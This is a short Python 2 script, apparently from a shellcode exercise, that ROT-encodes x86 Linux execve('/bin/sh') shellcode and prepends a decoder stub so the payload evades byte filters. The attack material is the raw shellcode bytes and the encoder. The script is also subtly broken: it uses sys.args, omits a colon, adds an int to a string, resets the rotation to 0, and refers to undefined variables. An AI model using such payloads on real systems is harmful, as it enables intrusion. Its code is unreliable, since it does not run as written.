#!/bin/python

import sys

if len(sys.args) is not 2:
    print "Usage: {0} N, where N is the number of rotations to be made".format(sys.args[0])
else 
    magic = int(sys.args[1])
    if magic < 1 or magic > 255:
        print "Invalid number of rotations"
        exit()

print "Generating ROT-{0} encoded payload".format(magic)

execvesh = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")

sc = "\xeb\x09\x5e\x80\x2e" + magic + "\x74\x08\x46\xeb\xf8\xe8\xf2\xff\xff\xff\x3e\xcd\x5d\x96\xef\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\xbd\x18\xda\x8d" + magic

magic = 0

for i in bytearray(shellcode):
	j = (i + magic)%256
	encoded1 += '\\x'
	encoded1 += '%02x' %j

	encoded2 += '0x'
	encoded2 += '%02x, ' %j

print "Format 1: {0}".format(encoded1)
print "Format 2: {0}".format(encoded2)
